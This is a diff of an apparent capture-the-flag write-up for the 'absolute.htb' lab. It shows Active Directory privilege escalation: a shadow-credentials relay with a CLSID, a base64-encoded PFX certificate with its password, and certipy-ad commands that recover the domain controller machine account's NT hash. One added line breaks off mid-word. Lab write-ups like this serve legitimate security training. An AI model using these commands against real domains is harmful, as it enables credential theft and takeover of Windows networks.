@@ -667,18 +667,10 @@ Info: Upload successful!
 
 Now its uploaded i can exploit this
 
-```python
-*Evil-WinRM* PS C:\Users\winrm_user\Desktop> cmd /c ver
-
-Microsoft Windows [Version 10.0.17763.3406]
-```
-
-First i need the windows version
-
-Then with some research i find that correlates to:
+Ill now look for some CLSIDs, ill just j
 
 ```python
-354ff91b-5e49-4bdc-a8e6-1cb6c6877182
+3c6859ce-230b-48a4-be6c-932c0c202048
 ```
 
 But however, running this tool on the target with `relay` and the shadowcred method and the CLSID the command fails
@@ -713,7 +705,7 @@ Now i have a certificate and a password, so ill put the cert into a pfx
 echo -n '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' | base64 -d | tee dc.pfx
 ```
 
-This placed the cert into the pfx, now i can use this pfx for get the NT hash for the DC machine account, since this ticket
+This placed the cert into the pfx, now i can use this pfx for get the NT hash for the DC machine account, since this certificate is for the DC machine account
 
 ```python
 faketime -f +7h certipy-ad auth -domain absolute.htb -username 'DC$' -password 'fZ1@fJ3/kM5=' -dc-ip 10.129.232.60 -pfx dc.pfx
@@ -729,4 +721,10 @@ Certipy v5.1.0 - by Oliver Lyak (ly4k)
 [*] Wrote credential cache to 'dc.ccache'
 [*] Trying to retrieve NT hash for 'dc$'
 [*] Got hash for 'dc$@absolute.htb': aad3b435b51404eeaad3b435b51404ee:a7864ab463177acb9aec553f18f42577
+```
+
+I now have the hash!
+
+```python
+
 ```
